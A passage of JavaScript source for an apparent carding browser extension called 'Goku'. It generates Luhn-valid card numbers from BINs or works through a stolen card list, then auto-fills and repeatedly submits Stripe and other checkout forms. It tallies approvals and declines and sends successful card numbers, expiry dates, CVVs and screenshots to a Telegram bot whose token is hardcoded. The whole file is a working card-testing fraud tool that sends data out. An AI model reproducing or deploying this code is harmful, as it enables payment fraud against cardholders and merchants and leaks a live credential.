        ((document.getElementById("fluxUsername").textContent = t),
          (document.getElementById("minimizedUsername").textContent = t),
          (document.getElementById("fluxAvatar").src = n));
        const i = document.getElementById("fluxUserStatus");
        (e.isVerified
          ? ((i.textContent = "Verified Access"),
            (i.style.color = "rgb(var(--gen-accent))"))
          : ((i.textContent = "Unverified"), (i.style.color = "#ef4444")),
          (document.getElementById("mobileUsername").textContent = t),
          (document.getElementById("mobileAvatar").src = n));
      },
    ),
    chrome.runtime.sendMessage({ action: "getIpAndRisk" }, (e) => {
      !chrome.runtime.lastError && e && updateIpRiskUI(e);
    }));
  const u = () => {
    state.extensionEnabled
      ? chrome.storage.sync.get(["isVerified"], (e) => {
          if (!e.isVerified)
            return void showNotification(
              "error",
              "Access Denied",
              "Verify Telegram first.",
            );
          if (state.autopayEnabled)
            return void showNotification(
              "warning",
              "Autopay Active",
              "Disable autopay for manual gen.",
            );
          ("function" == typeof generateCardDetails && generateCardDetails(),
            "function" == typeof autoFillAndSubmit && autoFillAndSubmit());
          const t = document.getElementById("generateButton"),
            n = document.getElementById("mobileGenerateBtn"),
            i = t.innerHTML;
          ((t.innerHTML = "WORKING..."),
            (n.innerText = "WORKING..."),
            setTimeout(() => {
              ((t.innerHTML = i), (n.innerText = "GENERATE CARD"));
            }, 1500));
        })
      : showNotification(
          "error",
          "Extension Disabled",
          "Turn on Master Switch.",
        );
  };
  (document.getElementById("generateButton").addEventListener("click", u),
    document.getElementById("mobileGenerateBtn").addEventListener("click", u));
  const m = (e) => {
      if (e && !state.extensionEnabled)
        return (
          (document.getElementById("autopayToggle").checked = !1),
          (document.getElementById("mobileAutopayToggle").checked = !1),
          void showNotification("error", "Extension Disabled")
        );
      ((state.autopayEnabled = e),
        (document.getElementById("autopayToggle").checked = e),
        (document.getElementById("mobileAutopayToggle").checked = e),
        e
          ? ("function" == typeof startAutopay && startAutopay(),
            showNotification("info", "Autopay Enabled"))
          : ("function" == typeof stopAutopay && stopAutopay(),
            showNotification("info", "Autopay Paused")));
    },
    g = (e) => {
      ((document.getElementById("privacyToggle").checked = e),
        (document.getElementById("mobilePrivacyToggle").checked = e),
        e
          ? ("function" == typeof hideSiteDetails && hideSiteDetails(),
            showNotification("info", "Privacy ON"))
          : ("function" == typeof showSiteDetails && showSiteDetails(),
            showNotification("info", "Privacy OFF")));
    };
  (document
    .getElementById("autopayToggle")
    .addEventListener("change", (e) => m(e.target.checked)),
    document
      .getElementById("mobileAutopayToggle")
      .addEventListener("change", (e) => m(e.target.checked)),
    document
      .getElementById("privacyToggle")
      .addEventListener("change", (e) => g(e.target.checked)),
    document
      .getElementById("mobilePrivacyToggle")
      .addEventListener("change", (e) => g(e.target.checked)),
    state.autopayEnabled &&
      ((document.getElementById("autopayToggle").checked = !0),
      (document.getElementById("mobileAutopayToggle").checked = !0)));
}
function blurMain() {
  const e = document.querySelector(
    ".ReadOnlyFormField-email .ReadOnlyFormField-title",
  );
  e &&
    ((e.style.transition = "filter 0.3s ease"),
    (e.style.filter = "blur(5px)"),
    (e.style.cursor = "pointer"),
    (e.title = "Click to reveal/hide"),
    (e.onclick = () => {
      "blur(5px)" === e.style.filter
        ? (e.style.filter = "none")
        : (e.style.filter = "blur(5px)");
    }));
}
function updateCountersUI() {
  const e = document.getElementById("Goku-attempts-counter"),
    t = document.getElementById("Goku-success-counter");
  void 0 !== state &&
    (e && (e.textContent = state.attemptCount || 0),
    t && (t.textContent = state.successCount || 0));
}
(setupMobileKeyboardFix(),
  setupMobileKeyboardFix(),
  void 0 === state &&
    (window.state = { attemptCount: 0, successCount: 0, autopayEnabled: !1 }),
  addGenerateButton());
const generateCardNumber = (e) => {
    let t = e;
    for (; t.length < 15; ) t += Math.floor(10 * Math.random()).toString();
    for (let e = 0; e < 10; e++) if (calculateLuhnChecksum(t + e)) return t + e;
    return t + "0";
  },
  calculateLuhnChecksum = (e) => {
    let t = 0,
      n = !1;
    for (let i = e.length - 1; i >= 0; i--) {
      let a = parseInt(e.charAt(i));
      (n && ((a *= 2), a > 9 && (a -= 9)), (t += a), (n = !n));
    }
    return t % 10 == 0;
  },
  generateExpirationDate = () => {
    const e = new Date().getFullYear();
    return `${Math.floor(12 * Math.random() + 1)
      .toString()
      .padStart(
        2,
        "0",
      )}/${(Math.floor(5 * Math.random()) + e + 1).toString().slice(-2)}`;
  },
  generateCardDetails = () => {
    const e = state.settings,
      t = {
        email:
          e.userEmail && "" !== e.userEmail.trim()
            ? e.userEmail
            : `Goku${Math.floor(900 * Math.random() + 100)}@gmail.com`,
        cardHolderName:
          e.userName && "" !== e.userName.trim() ? e.userName : "Goku Devs",
        addressLine1:
          e.userAddress && "" !== e.userAddress.trim()
            ? e.userAddress
            : "Goku Bolte",
        postalCode: e.userZip && "" !== e.userZip.trim() ? e.userZip : "10080",
        city:
          e.userCity && "" !== e.userCity.trim() ? e.userCity : "New Hampshire",
        country:
          e.customCountry && "" !== e.customCountry.trim()
            ? e.customCountry
            : "MO",
      };
    if (!1 === e.binMode) {
      if (!e.cardDetails || 0 === e.cardDetails.length)
        return (
          showNotification(
            "error",
            "Card List Empty",
            "Add cards in the 'Cards' tab.",
          ),
          null
        );
      const n = e.cardDetails[0],
        [i, a, o, r] = n.split("|"),
        s = {
          ...t,
          cardNumber: i,
          expirationDate: `${a}/${o.slice(-2)}`,
          cvv: r,
        };
      return ((state.lastGeneratedCardDetails = s), s);
    }
    {
      let n = [];
      if (
        (e.binList &&
          Array.isArray(e.binList) &&
          e.binList.length > 0 &&
          (n = n.concat(e.binList)),
        e.bin1 && n.push(e.bin1),
        e.bin2 && n.push(e.bin2),
        (n = [...new Set(n.filter(Boolean))]),
        0 === n.length)
      )
        return (
          showNotification(
            "error",
            "No BINs Found",
            "Please add a BIN in Settings.",
          ),
          null
        );
      let i = n[Math.floor(Math.random() * n.length)],
        a = null;
      if (i.includes("|")) {
        const e = i.split("|");
        ((i = e[0]), e.length >= 2 && (a = e[1]));
      }
      let o = i.replace(/\s/g, "").replace(/[^0-9]/g, ""),
        r = 16,
        s = 3;
      (/^3[47]/.test(o) && ((r = 15), (s = 4)),
        o.length >= r && (o = o.slice(0, r - 1)));
      const l = ((e, t) => {
          let n = e;
          for (; n.length < t - 1; ) n += Math.floor(10 * Math.random());
          let i = 0,
            a = !0;
          for (let e = n.length - 1; e >= 0; e--) {
            let t = parseInt(n[e]);
            (a && ((t *= 2), t > 9 && (t -= 9)), (i += t), (a = !a));
          }
          return n + ((10 - (i % 10)) % 10);
        })(o, r),
        d = a || generateExpirationDate(),
        c = Math.pow(10, s - 1),
        p = Math.pow(10, s) - 1,
        u = Math.floor(Math.random() * (p - c + 1) + c).toString(),
        m = { ...t, cardNumber: l, expirationDate: d, cvv: u };
      return ((state.lastGeneratedCardDetails = m), m);
    }
  };
function preventStripeAutoFocus() {
  isMobile() &&
    (document.activeElement &&
      ["INPUT", "TEXTAREA"].includes(document.activeElement.tagName) &&
      document.activeElement.blur(),
    document.addEventListener(
      "focus",
      (e) => {
        state.autopayEnabled &&
          "INPUT" === e.target.tagName &&
          setTimeout(() => {
            document.activeElement === e.target && e.target.blur();
          }, 100);
      },
      !0,
    ));
}
function clickPayWithCardButton() {
  const e = document.querySelector(
    'button.Button.AccordionButton[aria-label="Pay with card"]',
  );
  e ? e.click() : setTimeout(clickPayWithCardButton, 500);
}
((cachedElements = new Map()),
  (getElement = (e) => (
    cachedElements.has(e) || cachedElements.set(e, document.querySelector(e)),
    cachedElements.get(e)
  )),
  (simulateTyping = (e, t) => {
    (e.focus(),
      (e.value = t),
      e.dispatchEvent(new Event("input", { bubbles: !0 })),
      e.dispatchEvent(new Event("change", { bubbles: !0 })),
      e.blur());
  }),
  (clearFormFields = () => {
    ["input#cardNumber", "input#cardExpiry", "input#cardCvc"].forEach((e) => {
      const t = document.querySelector(e);
      t &&
        ((t.value = ""), t.dispatchEvent(new Event("input", { bubbles: !0 })));
    });
  }),
  (fillFormFields = () => {
    const e = generateCardDetails();
    if (!e) return;
    state.lastUsedCard = e.cardNumber;
    const t = {
        "input#email": e.email,
        "input#cardNumber": "0000000000000000",
        "input#cardExpiry": "02/31",
        "input#cardCvc": "000",
        "input#billingName": e.cardHolderName,
        "input#billingAddressLine1": e.addressLine1,
        "input#billingPostalCode": e.postalCode,
        "input#billingLocality": e.city,
      },
      n = document.getElementById("termsOfServiceConsentCheckbox");
    n && !n.checked && n.click();
    const i =
      document.querySelector("#billingCountry") ||
      document.querySelector("select[name='country']") ||
      document.querySelector("select[name='billingCountry']");
    i &&
      ((i.value = e.country),
      i.dispatchEvent(new Event("change", { bubbles: !0 })));
    for (const [e, n] of Object.entries(t)) {
      const t =
        ((a = e),
        cachedElements.has(a) ||
          cachedElements.set(a, document.querySelector(a)),
        cachedElements.get(a));
      t && simulateTyping(t, n);
    }
    var a;
    sendToInjected(e.cardNumber, e.expirationDate, e.cvv);
  }));
const clickSubscribeButton = () => {
    const e = document.querySelector(
      "button[type='submit'], button.SubmitButton, #submitButton",
    );
    e &&
      !e.disabled &&
      (state.attemptCount++,
      updateCountersUI(),
      e.click(),
      showNotification(
        "warning",
        "Submitting Card",
        `Trying: ${state.lastGeneratedCardDetails.cardNumber} | ${state.lastGeneratedCardDetails.expirationDate} |  ${state.lastGeneratedCardDetails.cvv}`,
      ));
  },
  autoFillAndSubmit = () => {
    state.autopayEnabled ||
    !1 !== state.settings.binMode ||
    0 !== state.settings.cardDetails.length
      ? setTimeout(() => {
          (fillFormFields(),
            blurMain(),
            setTimeout(() => {
              clickSubscribeButton();
            }, 1500));
        }, 2e3)
      : showNotification(
          "info",
          "Cannot Proceed",
          "Autopay off and no cards in list",
        );
  };
function startAutopay() {
  state.extensionEnabled && state.autopayEnabled && autoFillAndSubmit();
}
function stopAutopay() {
  autopayInterval && (clearInterval(autopayInterval), (autopayInterval = null));
}
function sendToInjected(e, t, n) {
  window.postMessage(
    { source: "content_script", type: "SET_CARD", number: e, date: t, cvv: n },
    "*",
  );
}
function runWhenFieldPresent(e, t) {
  document.querySelector(e)
    ? t()
    : new MutationObserver((n, i) => {
        document.querySelector(e) && (i.disconnect(), t());
      }).observe(document.body, { childList: !0, subtree: !0 });
}
function base64ToBlob(e) {
  const t = atob(e.split(",")[1]),
    n = e.split(",")[0].split(":")[1].split(";")[0],
    i = new ArrayBuffer(t.length),
    a = new Uint8Array(i);
  for (let e = 0; e < t.length; e++) a[e] = t.charCodeAt(e);
  return new Blob([i], { type: n });
}
window.addEventListener("message", (e) => {
  e.source === window &&
    e.data &&
    "GOKU_SITE_INFO" === e.data.type &&
    (state.currentSiteInfo = {
      name: e.data.data.site_name,
      url: e.data.data.business_url,
    });
});
const onPageLoad = () => {},
  initializeExtension = () => {
    (injectScript("js/interceptor.js"),
      injectScript("js/stripe/injected.js"),
      chrome.storage.sync.get(DEFAULT_SETTINGS, (e) => {
        chrome.storage.local.get(["cardDetails"], (t) => {
          ((state.settings = { ...e, ...t }),
            (state.extensionEnabled = e.extensionEnabled));
          const n = [
            /^pay\./,
            /checkout\.stripe\.com/,
            /^buy\.stripe/,
            /checkout/i,
            /stripe/i,
            /^pay\.krea\.ai$/,
            /taskade/i,
            /billing/i,
            /loudly/i,
          ].some(
            (e) =>
              e.test(window.location.hostname) ||
              e.test(window.location.pathname),
          );
          state.extensionEnabled &&
            n &&
            (addGenerateButton(),
            setupMobileKeyboardFix(),
            preventStripeAutoFocus(),
            updateCountersUI(),
            showNotification(
              "success",
              "🦇 Payment Page Detected 🕷️",
              "v2.0 – Join Telegram for updates!",
            ),
            clickPayWithCardButton(),
            runWhenFieldPresent(
              'input#cardNumber, input[name="cardnumber"], #card-element',
              () => {
                autoFillAndSubmit();
              },
            ));
        });
      }));
  };
async function sendTelegramMessageToUser(e, t, n = null) {
  chrome.storage.sync.get(
    ["telegramId", "isVerified", "botToken"],
    async (i) => {
      const a = i.botToken;
      let o = "",
        r = "";
      if (
        ("GROUP" === e
          ? ((o = "7662047366:AAGahCJ5R74W7FtOOe_xwZVM17E0xigEPkA"),
            (r = "-1002585746123"))
          : ((o = "7662047366:AAGahCJ5R74W7FtOOe_xwZVM17E0xigEPkA"), (r = i.telegramId)),
        !o || !r)
      )
        return;
      if (!("GROUP" === e || i.isVerified)) return;
      let s = !1;
      if (n)
        try {
          const e = base64ToBlob(n);
          if (!e) throw new Error("Blob conversion failed");
          const i = new FormData();
          (i.append("chat_id", r),
            i.append("caption", t),
            i.append("parse_mode", "Markdown"),
            i.append("photo", e, "screenshot.jpg"),
            (
              await fetch(`https://api.telegram.org/bot${o}/sendPhoto`, {
                method: "POST",
                body: i,
              })
            ).ok && (s = !0));
        } catch (e) {}
      if (!s)
        try {
          await fetch(`https://api.telegram.org/bot${o}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: r,
              text: t,
              parse_mode: "Markdown",
            }),
          });
        } catch (e) {}
    },
  );
}
function requestScreenshot() {
  chrome.runtime.sendMessage({ action: "capture_and_send" }, (e) => {
    chrome.runtime.lastError || e?.status;
  });
}
(chrome.runtime.onMessage.addListener((e, t, n) => {
  "updateSettings" === e.action
    ? ((state.settings = e.settings), state.settings)
    : "toggleExtension" === e.action &&
      ((state.extensionEnabled = e.enabled),
      state.extensionEnabled ? initializeExtension() : stopAutopay());
}),
  chrome.runtime.onMessage.addListener((e, t, n) => {
    "updateSettings" === e.action
      ? ((state.settings = e.settings), state.settings)
      : "toggleExtension" === e.action &&
        ((state.extensionEnabled = e.enabled),
        state.extensionEnabled ? initializeExtension() : stopAutopay());
  }),
  window.addEventListener("message", (e) => {
    if (e.source !== window) return;
    const t = e.data;
    if (!t || !0 !== t.__stripe_helper) return;
    const n = {
      card: state.lastGeneratedCardDetails,
      url: state.currentSiteInfo.url || window.location.hostname,
      response: {
        type: t.type,
        message: t.message || "N/A",
        code: t.decline_code || "N/A",
      },
    };
    if (
      (chrome?.runtime &&
        chrome.runtime.sendMessage({ action: "logResponse", data: n }),
      "success" === t.type)
    ) {
      try {
        new Audio(chrome.runtime.getURL("assets/hit.mp3"))
          .play()
          .catch((e) => {});
      } catch (e) {}
      (state.successCount++,
        updateCountersUI(),
        showNotification(
          "success",
          "Payment Success ✅",
          t.message || "Card worked!",
        ));
      const n = {
        name: state.currentSiteInfo.name,
        url: state.currentSiteInfo.url,
        date: new Date().toLocaleString(),
        bin: state.lastGeneratedCardDetails?.cardNumber.slice(0, 6) || "??????",
        card: state.lastGeneratedCardDetails?.cardNumber || "Unknown",
      };
      (chrome.storage.sync.get(["hittedSites"], (e) => {
        const t = e.hittedSites || [];
        (t.unshift(n),
          t.length > 50 && t.pop(),
          chrome.storage.sync.set({ hittedSites: t }),
          chrome.runtime.sendMessage({
            action: "updateHittedSites",
            hittedSites: t,
            latestHit: n,
          }));
      }),
        setTimeout(() => {
          chrome.runtime.sendMessage(
            {
              action: "capture_and_send",
              card: state.lastGeneratedCardDetails?.cardNumber,
            },
            (e) => {
              const n = e?.screenshotUrl || null,
                i = state.settings.telegramName || "User",
                a = state.lastGeneratedCardDetails,
                o = t.message || "Approved",
                r = state.currentSiteInfo.name || "Unknown Site",
                s = state.currentSiteInfo.url || "#";
              (sendTelegramMessageToUser(
                "GROUP",
                state.settings.sendSiteToGroup
                  ? `\n⚡️ *GOKU HIT* ⚡️\n━━━━━━━━━━━━━━━━━━\n🌍 *Target:* [${r}](${s})\n💳 *BIN:* \`${a.cardNumber.slice(0, 6)}\` • *Exp:* \`${a.expirationDate}\`\n👤 *User:* ${i}\n━━━━━━━━━━━━━━━━━━\n💀 *GOKU OS*\n`.trim()
                  : `\n✅ *PAYMENT SUCCESS*\n━━━━━━━━━━━━━━━━━━\n👤 *User:* ${i}\n💬 *Result:* ${o}\n━━━━━━━━━━━━━━━━━━\n`.trim(),
                n,
              ),
                sendTelegramMessageToUser(
                  "PRIVATE",
                  `✅ *Payment Success*\n💳 Card: \`${a.cardNumber}\`\n📅 Exp: \`${a.expirationDate}\`\n🔐 CVV: \`${a.cvv}\`\n🌍 Site: ${s}\nMsg: ${o}`,
                  n,
                ));
            },
          );
        }, 1500),
        !1 === state.settings.binMode &&
          state.settings.cardDetails.length > 0 &&
          (state.settings.cardDetails.shift(),
          chrome.storage.local.set({ cardDetails: state.settings.cardDetails }),
          chrome.runtime.sendMessage({
            action: "updateDashboard",
            cardDetails: state.settings.cardDetails,
          })),
        stopAutopay());
    }
    if (["card_declined", "invalid_cvc", "incorrect_number"].includes(t.type)) {
      let e = "Card Declined ❌";
      ("card_declined" === t.type
        ? (e = `Card Declined! Code: ${t.decline_code || "N/A"}`)
        : "invalid_cvc" === t.type
          ? (e = "Invalid CVC ❌")
          : "incorrect_number" === t.type && (e = "Incorrect Number ❌"),
        showNotification("error", e, t.message || "Payment failed"),
        !1 === state.settings.binMode &&
          state.settings.cardDetails.length > 0 &&
          (state.settings.cardDetails.shift(),
          chrome.storage.local.set({ cardDetails: state.settings.cardDetails }),
          chrome.runtime.sendMessage({
            action: "updateDashboard",
            cardDetails: state.settings.cardDetails,
          })),
        state.autopayEnabled &&
          (!1 === state.settings.binMode &&
          0 === state.settings.cardDetails.length
            ? (showNotification(
                "error",
                "Card List Exhausted",
                "No more cards to try",
              ),
              stopAutopay())
            : autoFillAndSubmit()));
    }
  }),
  chrome.storage.sync.get(["isVerified"], (e) => {
    e.isVerified
      ? initializeExtension()
      : showNotification(
          "error",
          "Access Denied",
          "Please verify your Telegram account first!",
        );
  }));
